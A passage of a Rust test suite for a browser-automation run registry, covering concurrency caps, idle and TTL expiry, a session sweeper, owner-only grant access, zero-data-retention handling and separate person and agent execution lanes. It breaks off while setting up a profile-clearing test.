        .map(|_| runs.try_reserve("org_a", Interactive).unwrap())
        .collect();
    assert_eq!(slots.len(), 200);
}

#[test]
fn concurrent_reservations_never_exceed_cap() {
    use crate::budget::RunClass::Interactive;
    let runs = registry(8, 0, 0);
    let granted = Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let keep = Arc::new(StdMutex::new(Vec::new()));
    let threads: Vec<_> = (0..64)
        .map(|_| {
            let runs = runs.clone();
            let granted = granted.clone();
            let keep = keep.clone();
            std::thread::spawn(move || {
                if let Ok(slot) = runs.try_reserve("org_a", Interactive) {
                    granted.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
                    keep.lock().unwrap().push(slot);
                }
            })
        })
        .collect();
    for thread in threads {
        thread.join().unwrap();
    }
    assert_eq!(granted.load(std::sync::atomic::Ordering::SeqCst), 8);
}

const T0: u64 = 1_000_000_000;

fn limits() -> crate::run_limits::RunLimits {
    crate::run_limits::RunLimits::default()
}

fn live_at(class: crate::budget::RunClass, explicit: Option<u64>) -> Arc<RunLive> {
    Arc::new(
        RunLive::new("org", "user", BrowserControlMode::AgentControl, 0)
            .with_run(class, explicit)
            .with_clock(T0),
    )
}

#[test]
fn agent_ttl_uses_explicit_runtime_plus_grace() {
    use crate::budget::RunClass::Agent;
    let live = live_at(Agent, Some(60));
    live.touch_at(T0 + 89_000);
    // 60 s asked for + 30 s grace = absolute lifetime of 90 s, touched or not.
    assert_eq!(live.verdict(T0 + 89_000, &limits()), None);
    let verdict = live.verdict(T0 + 91_000, &limits()).unwrap();
    assert_eq!(verdict.reason, ExpireReason::Ttl);
}

#[test]
fn agent_default_120_is_not_absolute() {
    use crate::budget::RunClass::Agent;
    // No explicit runtime (the 120 s default is not a request): the agent backstop applies.
    let live = live_at(Agent, None);
    live.touch_at(T0 + 200_000);
    assert_eq!(live.verdict(T0 + 200_000, &limits()), None);
    live.touch_at(T0 + 1_790_000);
    assert_eq!(live.verdict(T0 + 1_790_000, &limits()), None);
    assert_eq!(
        live.verdict(T0 + 1_801_000, &limits()).unwrap().reason,
        ExpireReason::Ttl
    );
}

#[test]
fn agent_idle_expires_and_ignores_viewers() {
    use crate::budget::RunClass::Agent;
    // Opening a viewer touches the run at the wall clock, so start the run there.
    let base = now_ms();
    let live = Arc::new(
        RunLive::new("org", "user", BrowserControlMode::AgentControl, 0)
            .with_run(Agent, None)
            .with_clock(base),
    );
    let _viewer = live.viewer_guard();
    let verdict = live.verdict(base + 310_000, &limits()).unwrap();
    assert_eq!(verdict.reason, ExpireReason::Idle);
}

#[test]
fn interactive_ignores_gateway_120s_ttl() {
    use crate::budget::RunClass::Interactive;
    // The gateway sends max_runtime_s 120 for every UI session; a person's session
    // must not be released at 120 s because of it.
    let live = live_at(Interactive, Some(120));
    live.touch_at(T0 + 600_000);
    assert_eq!(live.verdict(T0 + 600_000, &limits()), None);
}

#[test]
fn interactive_idle_blocked_by_viewer() {
    use crate::budget::RunClass::Interactive;
    let live = live_at(Interactive, None);
    assert_eq!(
        live.verdict(T0 + 901_000, &limits()).unwrap().reason,
        ExpireReason::Idle
    );
    let viewer = live.viewer_guard();
    live.touch_at(T0);
    assert_eq!(live.verdict(T0 + 3_000_000, &limits()), None, "a viewer holds off idle");
    drop(viewer);
}

#[test]
fn interactive_backstop_applies_with_viewer() {
    use crate::budget::RunClass::Interactive;
    let live = live_at(Interactive, None);
    let _viewer = live.viewer_guard();
    live.touch_at(T0 + 14_399_000);
    let verdict = live.verdict(T0 + 14_401_000, &limits()).unwrap();
    assert_eq!(verdict.reason, ExpireReason::MaxAge);
}

#[test]
fn takeover_idle_longer_than_interactive_idle() {
    use crate::budget::RunClass::Interactive;
    let live = live_at(Interactive, None);
    live.set_mode(BrowserControlMode::HumanTakeover, None).unwrap();
    live.touch_at(T0);
    assert_eq!(live.verdict(T0 + 901_000, &limits()), None, "past the normal idle limit");
    let verdict = live.verdict(T0 + 1_801_000, &limits()).unwrap();
    assert_eq!(verdict.reason, ExpireReason::TakeoverIdle);
}

#[test]
fn touch_resets_idle() {
    use crate::budget::RunClass::Interactive;
    let live = live_at(Interactive, None);
    live.touch_at(T0 + 800_000);
    assert_eq!(live.verdict(T0 + 1_000_000, &limits()), None);
    assert!(live.verdict(T0 + 1_800_000, &limits()).is_some());
}

#[test]
fn in_flight_is_never_expired() {
    use crate::budget::RunClass::Agent;
    let live = live_at(Agent, Some(1));
    let guard = live.in_flight_guard();
    assert_eq!(live.verdict(T0 + 99_999_000, &limits()), None);
    drop(guard);
    assert!(live.verdict(T0 + 99_999_000, &limits()).is_some());
}

/// A state whose registry sweeps for real (not dry) with the limits it is given.
fn swept_state(limits: crate::run_limits::RunLimits) -> AppState {
    let mut state = test_state_with_static_driver();
    state.agent_runs = new_runs_with(limits);
    state
}

async fn register(state: &AppState, org: &str, class: crate::budget::RunClass, started_ms: u64) -> (String, RunHandle) {
    let mut entry = entry_with_budget(None);
    entry.org_id = org.into();
    entry.actor_id = "user".into();
    let run_id = entry.run_id.to_string();
    let live = RunLive::new(org, "user", BrowserControlMode::AgentControl, 0)
        .with_run(class, None)
        .with_clock(started_ms);
    let handle = RunHandle::new(entry, live);
    let slot = state.agent_runs.try_reserve(org, class).unwrap();
    slot.commit(run_id.clone(), handle.clone());
    (run_id, handle)
}

#[tokio::test]
async fn sweep_releases_an_idle_run_once_and_leaves_the_checkpoint_active() {
    use crate::budget::RunClass::Interactive;
    let state = swept_state(crate::run_limits::RunLimits {
        sweeper: true,
        ..crate::run_limits::RunLimits::unlimited()
    });
    let (run_id, handle) = register(&state, "org", Interactive, T0).await;
    let rid = handle.entry.lock().await.run_id.clone();
    let mut events = state.event_sink.subscribe(&rid);
    // Not yet old enough.
    assert_eq!(sweep_once(&state, T0 + 100_000).await, SweepReport::default());
    assert_eq!(state.agent_runs.stats().live, 1);
    // Past the idle limit.
    let report = sweep_once(&state, T0 + 901_000).await;
    assert_eq!(report, SweepReport { expired: 1, would_expire: 0, ..SweepReport::default() });
    assert_eq!(state.agent_runs.stats().live, 0);
    assert!(handle.entry.lock().await.closed);
    assert!(lookup_run(&state, &run_id).is_none());
    // A second pass finds nothing to do.
    assert_eq!(sweep_once(&state, T0 + 902_000).await, SweepReport::default());
    // The lifecycle record says expired, and one agent.expired event went out.
    let timeline = state
        .receipts
        .list_browser_timeline_events("org", "user", &rid)
        .await
        .unwrap();
    assert!(timeline.iter().any(|event| matches!(
        &event.event,
        BrowserTimelineEventKind::Lifecycle {
            state: BrowserTimelineLifecycle::Expired,
            initiated_by: Some(BrowserTimelineInitiator::System),
        }
    )));
    let event = events.try_recv().expect("agent.expired was emitted");
    assert_eq!(event.event_type, EventType::AgentExpired);
    assert_eq!(event.payload["reason"], "idle");
    assert!(event.payload.get("url").is_none(), "no URL in the event");
}

#[tokio::test]
async fn dry_run_logs_and_releases_nothing() {
    use crate::budget::RunClass::Interactive;
    let state = swept_state(crate::run_limits::RunLimits {
        sweeper: true,
        sweeper_dry_run: true,
        ..crate::run_limits::RunLimits::unlimited()
    });
    let (run_id, _handle) = register(&state, "org", Interactive, T0).await;
    let report = sweep_once(&state, T0 + 5_000_000).await;
    assert_eq!(report, SweepReport { expired: 0, would_expire: 1, ..SweepReport::default() });
    assert!(lookup_run(&state, &run_id).is_some());
}

#[tokio::test]
async fn a_viewer_survives_idle_but_not_the_backstop() {
    use crate::budget::RunClass::Interactive;
    let state = swept_state(crate::run_limits::RunLimits::unlimited());
    let (run_id, handle) = register(&state, "org", Interactive, T0).await;
    let _viewer = handle.live.viewer_guard();
    handle.live.touch_at(T0);
    assert_eq!(sweep_once(&state, T0 + 3_000_000).await, SweepReport::default());
    assert!(lookup_run(&state, &run_id).is_some());
    assert_eq!(sweep_once(&state, T0 + 14_401_000).await.expired, 1);
    assert!(lookup_run(&state, &run_id).is_none());
}

#[tokio::test]
async fn an_in_flight_run_is_skipped_by_the_sweep() {
    use crate::budget::RunClass::Agent;
    let state = swept_state(crate::run_limits::RunLimits::unlimited());
    let (run_id, handle) = register(&state, "org", Agent, T0).await;
    let guard = handle.live.in_flight_guard();
    assert_eq!(sweep_once(&state, T0 + 9_999_000).await, SweepReport::default());
    drop(guard);
    assert_eq!(sweep_once(&state, T0 + 9_999_000).await.expired, 1);
    assert!(lookup_run(&state, &run_id).is_none());
}

#[tokio::test]
async fn zdr_expiry_writes_no_timeline_row_and_no_checkpoint() {
    use crate::budget::RunClass::Interactive;
    let state = swept_state(crate::run_limits::RunLimits::unlimited());
    let mut entry = entry_with_budget(None);
    entry.org_id = "org".into();
    entry.actor_id = "user".into();
    entry.zdr = ZdrMode::On;
    let run_id = entry.run_id.to_string();
    let rid = entry.run_id.clone();
    let live = RunLive::new("org", "user", BrowserControlMode::AgentControl, 0)
        .with_run(Interactive, None)
        .with_clock(T0);
    state
        .agent_runs
        .try_reserve("org", Interactive)
        .unwrap()
        .commit(run_id.clone(), RunHandle::new(entry, live));
    assert_eq!(sweep_once(&state, T0 + 901_000).await.expired, 1);
    assert!(state
        .receipts
        .list_browser_timeline_events("org", "user", &rid)
        .await
        .unwrap()
        .is_empty());
    assert!(state.receipts.load_run_checkpoint("org", &rid).await.unwrap().is_none());
}

#[tokio::test]
async fn close_run_while_another_reference_is_held_still_releases() {
    use crate::budget::RunClass::Interactive;
    let state = swept_state(crate::run_limits::RunLimits::unlimited());
    let (run_id, handle) = register(&state, "org", Interactive, T0).await;
    let held = handle.entry.clone(); // another reference to the run
    finish_run(&state, &run_id, handle, CloseReason::Explicit).await.unwrap();
    assert!(lookup_run(&state, &run_id).is_none());
    assert!(held.lock().await.closed, "the run is closed even though a reference outlives it");
    assert_eq!(state.agent_runs.stats().live, 0);
}

#[tokio::test]
async fn a_failed_start_frees_its_slot() {
    use crate::budget::RunClass::Interactive;
    let state = swept_state(crate::run_limits::RunLimits {
        max_concurrent_runs: 1,
        ..crate::run_limits::RunLimits::unlimited()
    });
    let slot = state.agent_runs.try_reserve("org", Interactive).unwrap();
    assert!(state.agent_runs.try_reserve("org", Interactive).is_err());
    drop(slot);
    assert!(state.agent_runs.try_reserve("org", Interactive).is_ok());
}

// ---- WS2.D follow-up: the 404 for a released run says whether it can be resumed

fn gone_checkpoint(run_id: &RunKind, actor: &str, zdr: ZdrMode, status: AgentRunStatus) -> AgentRunCheckpoint {
    AgentRunCheckpoint {
        org_id: "org".into(),
        actor_id: actor.into(),
        run_id: run_id.to_string(),
        lease_id: "lease_01ARZ3NDEKTSV4RRFFQ69G5FAV".into(),
        profile_id: "prof_01ARZ3NDEKTSV4RRFFQ69G5FAV".into(),
        step: 2,
        current_url: "https://example.com".into(),
        page_hash: "blake3:abc".into(),
        constraints: quarry_core::contracts::AgentConstraints {
            max_steps: 5,
            allowed_domains: vec!["example.com".into()],
            max_runtime_s: Some(60),
            max_cost_usd: None,
        },
        persist_profile: true,
        profile_scope: BrowserProfileScope::UserPrivate,
        viewport: None,
        zdr,
        grant_id: None,
        status,
        control_mode: BrowserControlMode::AgentControl,
        control_epoch: 0,
        budget: None,
        policy_mode: None,
        next_step: 2,
        trace_seq: 0,
        policy_ask: None,
        origin: None,
        model_run_id: None,
    }
}

fn user_in_org(org: &str, user: &str) -> crate::auth::Claims {
    let mut claims = crate::test_support::claims_for_org(org);
    claims.user_id = user.into();
    claims.sub = user.into();
    claims
}

async fn gone_body(state: &AppState, claims: &crate::auth::Claims, run_id: &str) -> serde_json::Value {
    let (status, Json(envelope)) = run_gone_err(state, claims, "req", run_id).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    serde_json::to_value(&envelope).unwrap()
}

#[tokio::test]
async fn a_released_run_tells_its_owner_it_can_be_resumed() {
    let state = test_state_with_static_driver();
    let run_id: RunKind = Id::new();
    state
        .receipts
        .save_run_checkpoint(gone_checkpoint(&run_id, "user", ZdrMode::Off, AgentRunStatus::Active))
        .await
        .unwrap();

    let body = gone_body(&state, &user_in_org("org", "user"), &run_id.to_string()).await;
    assert_eq!(body["error"]["details"]["reason"], "run_not_live");
    assert_eq!(body["error"]["details"]["resumable"], true);
    assert_eq!(body["error"]["details"]["resume_run_id"], run_id.to_string());
}

#[tokio::test]
async fn the_resumable_hint_is_for_the_owner_of_a_live_non_zdr_checkpoint_only() {
    let state = test_state_with_static_driver();
    let owned: RunKind = Id::new();
    let zdr: RunKind = Id::new();
    let closed: RunKind = Id::new();
    for (run, zdr_mode, status) in [
        (&owned, ZdrMode::Off, AgentRunStatus::Active),
        (&zdr, ZdrMode::On, AgentRunStatus::Active),
        (&closed, ZdrMode::Off, AgentRunStatus::Closed),
    ] {
        state
            .receipts
            .save_run_checkpoint(gone_checkpoint(run, "user", zdr_mode, status))
            .await
            .unwrap();
    }
    let plain = |body: &serde_json::Value| body["error"]["details"].is_null();

    // Somebody else in the same org, and another org entirely, learn nothing.
    assert!(plain(&gone_body(&state, &user_in_org("org", "someone-else"), &owned.to_string()).await));
    assert!(plain(&gone_body(&state, &user_in_org("other-org", "user"), &owned.to_string()).await));
    // A ZDR run left nothing to resume, a closed run cannot be resumed.
    assert!(plain(&gone_body(&state, &user_in_org("org", "user"), &zdr.to_string()).await));
    assert!(plain(&gone_body(&state, &user_in_org("org", "user"), &closed.to_string()).await));
    // An id that is not a run id, and one nobody ever started.
    assert!(plain(&gone_body(&state, &user_in_org("org", "user"), "not-a-run-id").await));
    let never: RunKind = Id::new();
    assert!(plain(&gone_body(&state, &user_in_org("org", "user"), &never.to_string()).await));
}

#[tokio::test]
async fn a_step_on_a_released_run_carries_the_hint() {
    let state = test_state_with_static_driver();
    let run_id: RunKind = Id::new();
    state
        .receipts
        .save_run_checkpoint(gone_checkpoint(&run_id, "user", ZdrMode::Off, AgentRunStatus::Active))
        .await
        .unwrap();
    let result = step(
        State(state.clone()),
        Extension(user_in_org("org", "user")),
        Path(run_id.to_string()),
        Json(StepBody {
            grant_id: None,
            action: AgentAction::Navigate { url: "https://example.com".into() },
            instruction: None,
            extraction_profile: None,
            initiated_by: None,
            ai_run_id: None,
            agent_label: None,
            expect: None,
        }),
    )
    .await;
    let (status, Json(envelope)) = result.expect_err("the run is not live");
    assert_eq!(status, StatusCode::NOT_FOUND);
    let rendered = serde_json::to_value(&envelope).unwrap();
    assert_eq!(rendered["error"]["details"]["resumable"], true);
}

// WS1.B: the live owner projection carries the session grant id, which the
// Verevon BFF reads to derive AI-run grants. Without it every AI run started
// from a live session would be refused as having no grant.
#[test]
fn the_live_owner_projection_carries_the_session_grant_id() {
    let mut entry = entry_with_budget(None);
    entry.grant_id = Some("grant-live-abc".into());
    let json = serde_json::to_value(live_browser_session_projection(
        &entry,
        Vec::new(),
        None,
        BrowserDriverCapabilities::default(),
    ))
    .expect("projection serializes");
    assert_eq!(json["grantId"], "grant-live-abc");

    entry.grant_id = None;
    let json = serde_json::to_value(live_browser_session_projection(
        &entry,
        Vec::new(),
        None,
        BrowserDriverCapabilities::default(),
    ))
    .expect("projection serializes");
    assert!(json.get("grantId").is_none(), "{json}");
}

// The grant id is only ever served to the run's owner: another user of the
// same organization, or a caller from another organization, gets the same
// 404 as for an unknown run, before any projection is built.
#[tokio::test]
async fn the_grant_id_is_served_only_to_the_runs_owner() {
    let state = test_state_with_static_driver();
    let mut entry = entry_with_budget(None);
    entry.grant_id = Some("grant-live-abc".into());
    entry.actor_id = "user-owner".into();
    let run_id = entry.run_id.to_string();
    state
        .agent_runs
        .lock()
        .expect("agent_runs mutex")
        .insert(run_id.clone(), handle_for(entry));

    for (org, user) in [("org", "user-other"), ("org-other", "user-owner")] {
        let mut claims = crate::test_support::claims_for_org(org);
        claims.sub = user.into();
        claims.user_id = user.into();
        claims.principal_type = Some("user".into());
        let result = browser_session(
            State(state.clone()),
            Extension(claims),
            Path(run_id.clone()),
        )
        .await;
        let Err((status, Json(envelope))) = result else {
            panic!("{org}/{user} read another user's browser session");
        };
        assert_eq!(status, StatusCode::NOT_FOUND, "{org}/{user}");
        let rendered = serde_json::to_string(&envelope).expect("envelope serializes");
        assert!(!rendered.contains("grant-live-abc"), "{rendered}");
    }

    // The owner, in the run's own organization, is served the projection
    // with the grant id: without this the denials above would also pass
    // against a gate that refused everyone.
    let mut claims = crate::test_support::claims_for_org("org");
    claims.sub = "user-owner".into();
    claims.user_id = "user-owner".into();
    claims.principal_type = Some("user".into());
    let Ok(Json(envelope)) =
        browser_session(State(state.clone()), Extension(claims), Path(run_id.clone())).await
    else {
        panic!("the run's owner was refused their own browser session");
    };
    let rendered = serde_json::to_value(&envelope).expect("envelope serializes");
    assert_eq!(rendered["data"]["grantId"], "grant-live-abc", "{rendered}");
}

fn broker_grant(owner: &str, domains: &[&str], zdr: bool) -> quarry_runtime::GrantValidation {
    quarry_runtime::GrantValidation {
        grant_id: "grant-1".into(),
        active: true,
        expires_at: None,
        allowed_domains: domains.iter().map(|d| (*d).to_owned()).collect(),
        allowed_actions: Vec::new(),
        allowed_frame_ids: Vec::new(),
        allowed_dialog_ids: Vec::new(),
        allowed_artifact_ids: Vec::new(),
        parent_grant_id: None,
        kind: "session".into(),
        owner_id: owner.into(),
        zdr,
        budget: None,
        policy_mode: String::new(),
        denied_domains: Vec::new(),
        absolute_expires_at: None,
        resource_id: String::new(),
        key_id: String::new(),
        web_policy: None,
        mail_connection_id: String::new(),
        grant_origin: String::new(),
    }
}

fn user_claims(user: &str) -> crate::auth::Claims {
    let mut claims = crate::test_support::claims_for_org("org");
    claims.sub = user.into();
    claims.user_id = user.into();
    claims.principal_type = Some("user".into());
    claims
}

// Plan name (WS1.B): user_cannot_use_another_users_grant.
#[test]
fn user_cannot_use_another_users_grant() {
    let grant = broker_grant("user-owner", &["example.com"], false);
    for require in [false, true] {
        assert_eq!(
            bind_validated_grant(&grant, &user_claims("user-other"), require),
            Err("browser grant belongs to another user".to_owned()),
            "require={require}"
        );
        assert!(bind_validated_grant(&grant, &user_claims("user-owner"), require).is_ok());
    }
    // A service principal acts for the run's owner; the broker's org
    // scoping, not the owner, bounds it.
    assert!(
        bind_validated_grant(&grant, &service_claims("org", "execution-core"), true).is_ok()
    );
    // A grant without an owner is refused to a user when grants are required.
    let ownerless = broker_grant("", &["example.com"], false);
    assert!(bind_validated_grant(&ownerless, &user_claims("user-owner"), true).is_err());
    assert!(bind_validated_grant(&ownerless, &user_claims("user-owner"), false).is_ok());
}

// Plan name (WS1.B): zdr_grant_cannot_back_a_non_zdr_run.
#[test]
fn zdr_grant_cannot_back_a_non_zdr_run() {
    assert!(!zdr_grant_may_back_run(true, false));
    assert!(zdr_grant_may_back_run(true, true));
    assert!(zdr_grant_may_back_run(false, false));
    assert!(zdr_grant_may_back_run(false, true));
}

// Plan name (WS1.B): validated_grant_overrides_client_domains_in_every_mode.
#[test]
fn validated_grant_overrides_client_domains_in_every_mode() {
    let claims = user_claims("user-owner");
    let grant = broker_grant("user-owner", &["api.example.com", "example.org"], false);
    for require in [false, true] {
        assert_eq!(
            bind_validated_grant(&grant, &claims, require),
            Ok(Some(vec!["api.example.com".to_owned(), "example.org".to_owned()])),
            "require={require}"
        );
    }
    // A non-canonical broker policy is refused, never repaired.
    let loose = broker_grant("user-owner", &["API.example.com"], false);
    assert!(bind_validated_grant(&loose, &claims, false).is_err());
    // A grant without hosts leaves the caller's constraints only when grants
    // are not required; when they are, it is refused.
    let hostless = broker_grant("user-owner", &[], false);
    assert_eq!(bind_validated_grant(&hostless, &claims, false), Ok(None));
    assert!(bind_validated_grant(&hostless, &claims, true).is_err());
}

/// A grant validator that records every call (`"<plain>"` for the org-blind
/// `validate`, the org for `validate_for_org`) and answers with a usable run
/// grant, or with the sensitive approval for `grant_approval_1`.
struct RecordingGrantValidator(std::sync::Mutex<Vec<(String, String)>>);

impl RecordingGrantValidator {
    fn new() -> Arc<Self> {
        Arc::new(Self(std::sync::Mutex::new(Vec::new())))
    }

    fn calls(&self) -> Vec<(String, String)> {
        self.0.lock().unwrap().clone()
    }
}

#[async_trait::async_trait]
impl quarry_runtime::grant_validator::GrantValidator for RecordingGrantValidator {
    async fn validate(
        &self,
        grant_id: &str,
    ) -> QuarryResult<quarry_runtime::grant_validator::GrantValidation> {
        self.0
            .lock()
            .unwrap()
            .push(("<plain>".into(), grant_id.into()));
        Err(QuarryError::new(ErrorCode::Internal, "org-blind call"))
    }

    async fn validate_for_org(
        &self,
        org_id: &str,
        grant_id: &str,
    ) -> QuarryResult<quarry_runtime::grant_validator::GrantValidation> {
        self.0.lock().unwrap().push((org_id.into(), grant_id.into()));
        let grant = if grant_id == "grant_approval_1" {
            serde_json::json!({
                "grant_id": grant_id,
                "active": true,
                "kind": "sensitive_approval",
                "allowed_actions": ["respond_dialog"],
                "allowed_dialog_ids": ["dlg_1"],
                "parent_grant_id": "grant_run_1",
            })
        } else {
            serde_json::json!({
                "grant_id": grant_id,
                "active": true,
                "kind": "run",
            })
        };
        Ok(serde_json::from_value(grant).unwrap())
    }
}

/// Forwarding only: `validate_sensitive_approval` hands the validator the org
/// it was given. That the admission chain gives it the run's org is pinned by
/// `admission_validates_the_run_and_its_approval_for_the_runs_org`.
#[tokio::test]
async fn sensitive_approval_helper_forwards_the_org_it_is_handed() {
    let recording = RecordingGrantValidator::new();
    let mut state = test_state_with_static_driver();
    state.grant_validator = recording.clone();
    let mut approval = SensitiveApproval {
        grant_id: "grant_approval_1".into(),
        parent_grant_id: "grant_run_1".into(),
        action: "respond_dialog",
        frame_id: None,
        dialog_id: Some("dlg_1".into()),
        artifact_id: None,
        otp_binding: None,
    };
    validate_sensitive_approval(&state, "org-handed-down", &mut approval)
        .await
        .expect("the approval grant matches the observed action");
    assert_eq!(
        recording.calls(),
        vec![("org-handed-down".to_owned(), "grant_approval_1".to_owned())]
    );
}

/// The chain's two grant checks (gate 4, the run grant, and gate 10, the
/// sensitive approval) both reach the validator with the org of the verified
/// run (`entry.org_id`), and the org-blind `validate` is never used. The run's
/// org differs from the default test org so a call site that passes a constant,
/// an empty string or another org's id fails here. The approval is consumed.
#[tokio::test]
async fn admission_validates_the_run_and_its_approval_for_the_runs_org() {
    let recording = RecordingGrantValidator::new();
    let mut state = test_state_with_static_driver();
    state.grant_validator = recording.clone();

    let mut entry = entry_with_budget(None);
    entry.org_id = "org-of-the-run".into();
    entry.grant_id = Some("grant_run_1".into());
    let observed = Arc::new(
        serde_json::from_value(serde_json::json!({
            "run_id": entry.run_id,
            "step": 1,
            "url": "https://example.test/",
            "dialogs": [{
                "dialog_id": "dlg_1",
                "kind": "confirm",
                "message": "ok?",
                "opened_at_ms": 1,
            }],
            "observed_at": "2026-01-01T00:00:00Z",
        }))
        .expect("a minimal observation with one open dialog"),
    );
    let handle = handle_for(entry);
    let lane_ref = handle.entry.lock().await.human_lane.clone();
    lane_ref.0.lock().await.last_observation = Some(observed);
    let lane = lane_ref.0.lock().await;
    let mut entry = handle.entry.lock().await;

    let action = respond_dialog();
    admit_action(&state, &handle, &mut entry, input_observed(StepInitiator::Agent, &action, true, &lane))
        .await
        .expect("the run grant and the approval grant are both usable");

    assert_eq!(
        recording.calls(),
        vec![
            ("org-of-the-run".to_owned(), "grant_run_1".to_owned()),
            ("org-of-the-run".to_owned(), "grant_approval_1".to_owned()),
        ],
        "gate 4 and gate 10 each validate for the run's org, never org-blind"
    );
    assert!(
        entry.used_sensitive_approval_grants.contains("grant_approval_1"),
        "the approval grant is consumed once it validated"
    );
}

// WS8.H: execution lanes. These are the lock-level contracts of the two lanes. The
// browser-backed proof (an 8 s `wait` on the delegate with a person's click returning
// under one second) is the deployment evidence of the slice, not a unit test.

#[tokio::test]
async fn human_action_is_not_blocked_by_in_flight_agent_step() {
    let handle = handle_for(entry_with_budget(None));
    // An in-flight delegate step holds its own lane, and the run entry is released while
    // the browser runs. The person's lane and the entry must both stay available.
    let delegate_lane = LaneRef::new(LaneState::default());
    let _delegate_step = delegate_lane.0.lock().await;
    let human = tokio::time::timeout(Duration::from_secs(1), human_lane_of(&handle))
        .await
        .expect("the person's lane is handed out while a delegate step runs");
    tokio::time::timeout(Duration::from_secs(1), human.0.lock())
        .await
        .expect("the person's lane is free while a delegate step runs");
    tokio::time::timeout(Duration::from_secs(1), handle.entry.lock())
        .await
        .expect("the run entry is free while a delegate step runs");
    assert!(delegate_lane != human, "the two lanes are distinct");
}

#[tokio::test]
async fn agent_step_is_not_blocked_by_in_flight_human_action() {
    let handle = handle_for(entry_with_budget(None));
    let human = human_lane_of(&handle).await;
    // A person's action in flight holds the person's lane only.
    let _person_action = human.0.lock().await;
    let delegate_lane = LaneRef::new(LaneState::default());
    tokio::time::timeout(Duration::from_secs(1), delegate_lane.0.lock())
        .await
        .expect("the delegate's lane is free while the person's action runs");
    tokio::time::timeout(Duration::from_secs(1), handle.entry.lock())
        .await
        .expect("the run entry is free while the person's action runs");
}

#[tokio::test]
async fn lanes_use_distinct_observation_contexts() {
    let handle = handle_for(entry_with_budget(None));
    let human = human_lane_of(&handle).await;
    let delegate = LaneRef::new(LaneState::default());
    {
        let mut lane = human.0.lock().await;
        lane.ctx.step = 5;
        lane.ctx.current_url = "https://example.test/a".to_owned();
    }
    let lane = delegate.0.lock().await;
    assert_eq!(lane.ctx.step, 0, "the delegate starts from its own step count");
    assert!(lane.ctx.current_url.is_empty(), "the delegate sees no page of the person's lane");
    assert!(lane.last_observation.is_none());
}

#[tokio::test]
async fn event_keys_are_unique_across_lanes() {
    let handle = handle_for(entry_with_budget(None));
    // Both lanes reserve from the one run-wide counter, in any interleaving.
    let keys: Vec<u32> = (0..64).map(|_| handle.live.reserve_step()).collect();
    let unique: std::collections::HashSet<u32> = keys.iter().copied().collect();
    assert_eq!(unique.len(), keys.len(), "no two steps of the run share a key");
    assert_eq!(keys, (0..64).collect::<Vec<u32>>(), "keys run consecutively from the start");
}

/// D2: a resumed run's first step key is past every key the run used: the checkpoint's
/// `next_step`, its completed `step` count, and one past its last receipt, whichever is
/// highest (a legacy checkpoint has `next_step` 0).
#[test]
fn a_resume_starts_past_every_step_key_the_run_used() {
    let mut checkpoint = gone_checkpoint(
        &RunKind::new(),
        "user",
        ZdrMode::Off,
        AgentRunStatus::Active,
    );
    checkpoint.next_step = 0;
    assert_eq!(
        resume_next_step(&checkpoint, None),
        2,
        "no receipts: the completed steps"
    );
    assert_eq!(
        resume_next_step(&checkpoint, Some(4)),
        5,
        "a legacy checkpoint: one past the last receipt"
    );
    checkpoint.next_step = 9;
    assert_eq!(
        resume_next_step(&checkpoint, Some(4)),
        9,
        "keys with no receipt"
    );
    assert_eq!(
        resume_next_step(&checkpoint, Some(u32::MAX)),
        u32::MAX,
        "no overflow"
    );
}

/// D2: every checkpoint save carries the run's next step key, including the keys of failed
/// steps that the completed `step` count leaves out.
#[tokio::test]
async fn the_checkpoint_carries_the_next_step_key() {
    let handle = handle_for(entry_with_budget(None));
    for _ in 0..3 {
        handle.live.reserve_step();
    }
    let entry = handle.entry.lock().await;
    let checkpoint = checkpoint_for_entry(&entry, &handle.live);
    assert_eq!(
        (checkpoint.step, checkpoint.next_step),
        (entry.summary.step, 3)
    );
}

#[tokio::test]
async fn receipt_epoch_is_the_admission_epoch() {
    let state = test_state_with_static_driver();
    let handle = handle_for(entry_with_budget(None));
    let mut entry = handle.entry.lock().await;
    let action = AgentAction::Navigate {
        url: "https://example.com/".to_owned(),
    };
    let admitted = admit_action(&state, &handle, &mut entry, input(StepInitiator::Agent, &action, true))
        .await
        .expect("an agent navigate in agent control is admitted");
    // The receipt of the step is stamped with the epoch the admission saw, not a later one.
    assert_eq!(admitted.control_epoch, handle.live.snapshot().epoch);
}

#[tokio::test]
async fn finish_run_waits_for_in_flight_lane_with_timeout() {
    let handle = handle_for(entry_with_budget(None));
    let lanes = vec![human_lane_of(&handle).await];
    // A running action holds its lane. A close waits for it, but only so long.
    let _running = lanes[0].0.lock().await;
    let started = std::time::Instant::now();
    wait_for_lanes("run_lane_wait", &lanes, Duration::from_millis(200)).await;
    let waited = started.elapsed();
    assert!(waited >= Duration::from_millis(150), "the close waited for the running action");
    assert!(waited < Duration::from_secs(3), "the close gave up at its bound");
}

#[tokio::test]
async fn projection_does_not_wait_for_a_running_step() {
    let handle = handle_for(entry_with_budget(None));
    let lane = human_lane_of(&handle).await;
    // A step is running: it holds its lane and has released the entry.
    let _running = lane.0.lock().await;
    let entry = tokio::time::timeout(Duration::from_secs(1), handle.entry.lock())
        .await
        .expect("the entry is free while a step runs");
    let json = serde_json::to_value(live_browser_session_projection(
        &entry,
        Vec::new(),
        None,
        BrowserDriverCapabilities::default(),
    ))
    .expect("the projection serializes");
    assert_eq!(json["step"], serde_json::json!(entry.summary.step));
}

// ---- F-t2-068: clearing a profile that a live run holds

#[tokio::test]
async fn clear_data_is_refused_while_a_live_run_holds_the_profile_and_runs_once_it_closes() {
    use crate::budget::RunClass::Interactive;
    use crate::profile_guard::OwnerEnforce;
    use crate::profile_routes::{clear_profile_data, ClearDataRequest};
    use axum::extract::{Path, State};
    use axum::http::StatusCode;
    use axum::{Extension, Json};
    use quarry_browser::session::{
        Cookie, ProfileMetadata, ProfileScope, SaveMeta, SessionSnapshot,
    };

    let mut state = swept_state(crate::run_limits::RunLimits::unlimited());
    state.profile_clear_data = true;
    state.profile_owner_enforce = OwnerEnforce::Enforce;
    let profile: quarry_core::ids::kinds::ProfileKind = Id::new();
    state
        .profiles
        .save_metadata(
            "org",
            &profile,
            &ProfileMetadata {
                name: None,
                scope: ProfileScope::UserPrivate,
                owner: Some("user".into()),
            },
        )
        .await
        .unwrap();
    let stored = SessionSnapshot {
        cookies: vec![Cookie {
            name: "sid".into(),
            value: "v".into(),
            ..Default::default()
        }],
        ..Default::default()
    };
    state
        .profiles
        .save("org", &profile, &stored, &SaveMeta::now(Some("user".into())))
        .await
        .unwrap();

